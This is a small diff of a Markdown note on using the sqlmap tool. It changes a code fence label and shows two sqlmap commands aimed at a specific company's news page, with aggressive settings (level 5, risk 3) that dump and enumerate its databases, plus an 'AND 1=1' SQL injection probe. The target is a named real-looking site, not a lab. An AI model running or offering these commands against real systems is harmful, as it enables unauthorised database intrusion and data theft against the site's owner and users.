@@ -14,7 +14,7 @@ tags: a
 [全參數中文詳解CSDN](https://blog.csdn.net/Breeze_CAT/article/details/80628392)**
 ---
 # Usage
-```shell=
+```python=
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131 --force-ssl --dbms MySQL -v 3 --level 5 --risk 3 --dump MySQL --dbs
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131+AND+1%3D1+--+
 ```
